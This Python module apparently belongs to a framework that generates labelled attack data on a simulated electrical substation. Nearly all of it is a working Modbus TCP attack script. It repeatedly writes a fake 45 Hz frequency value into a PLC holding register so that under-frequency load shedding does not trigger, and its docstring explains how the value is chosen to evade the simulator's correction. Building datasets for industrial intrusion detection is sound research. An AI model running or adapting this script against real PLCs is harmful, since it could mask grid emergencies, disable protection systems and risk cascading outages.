"""
Attack #11: Frequency_Desync (Grid Frequency Desynchronization)
================================================================
Target register: HR4 (Frequency x100)
Technique: Forces a fixed low-frequency reading onto the PLC, bypassing the
           substation's actual frequency regulation and masking it from the
           protection system.
Effect: Under-Frequency Load Shedding (UFLS) is not triggered even though
        the grid is effectively operating below the emergency threshold,
        risking cascading overload.
MITRE ATT&CK for ICS: T0836 - Modify Parameter

Note: the physical orchestrator (main_sim.py) only overwrites this register
with the real computed frequency when the value last written to the PLC
falls inside the normal operating band (49.00-51.00 Hz); a value outside
that band is treated as an active attack signature and is left untouched.
FAKE_FREQ must therefore be set below 49.00 Hz (4900) for the injected
value to persist in the dataset rather than being overwritten each cycle.
"""

import time
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from pymodbus.client import ModbusTcpClient
from attacks.config import (
    PLC_IP, PLC_PORT, UNIT_ID,
    HR4_FREQ,
    ATTACK_LOOP_DELAY,
    LABEL_FREQ_DESYNC
)

# ---------------------------------------------------------------------------
# Attack parameters
# ---------------------------------------------------------------------------
FAKE_FREQ = 4500             # 45.00 Hz - below the 47.5 Hz emergency threshold
                             # and outside the 49.00-51.00 Hz normal band, so the
                             # value persists instead of being overwritten by
                             # the orchestrator's real-physics write-back.

ATTACK_NAME = "Frequency_Desync"
ATTACK_ID   = LABEL_FREQ_DESYNC


def run_attack(duration_sec=600, label_manager=None):
    """
    Continuously writes a fixed 45.00 Hz value to HR4, forcing the PLC's
    frequency reading below the emergency threshold.
    """
    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)

    if not client.connect():
        print(f"[-] PLC connection failed: {PLC_IP}:{PLC_PORT}")
        return False

    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target: {PLC_IP}:{PLC_PORT} - Register HR{HR4_FREQ}")
    print(f"  Injected value: {FAKE_FREQ} (= {FAKE_FREQ/100:.2f} Hz, fixed)")
    print(f"  Duration: {duration_sec}s ({duration_sec//60} min)")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(
            ATTACK_ID, ATTACK_NAME,
            f"HR{HR4_FREQ}={FAKE_FREQ} ({FAKE_FREQ/100:.2f}Hz fixed)"
        )

    start_time = time.time()
    packet_count = 0

    try:
        while (time.time() - start_time) < duration_sec:
            try:
                client.write_register(address=HR4_FREQ, value=FAKE_FREQ)
                packet_count += 1
            except Exception as e:
                if packet_count % 50 == 0:
                    print(f"  [FREQ] Reconnecting... ({e})")
                try:
                    client.close()
                    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
                    client.connect()
                except Exception:
                    pass
                time.sleep(0.5)
                continue

            if packet_count % 100 == 0:
                elapsed = time.time() - start_time
                remaining = duration_sec - elapsed
                print(f"  [FREQ] packet #{packet_count} | "
                      f"HR{HR4_FREQ}->{FAKE_FREQ} | "
                      f"remaining: {remaining:.0f}s")

            time.sleep(ATTACK_LOOP_DELAY)

    except KeyboardInterrupt:
        print("\n  [FREQ] Manual stop!")

    finally:
        elapsed = time.time() - start_time
        client.close()
        if label_manager:
            label_manager.log_attack_end(
                ATTACK_ID, ATTACK_NAME,
                f"{packet_count} packets, {elapsed:.1f}s"
            )
        print(f"\n  [FREQ] Attack finished: {packet_count} packets, {elapsed:.1f}s")
        return True


if __name__ == "__main__":
    run_attack(duration_sec=60)
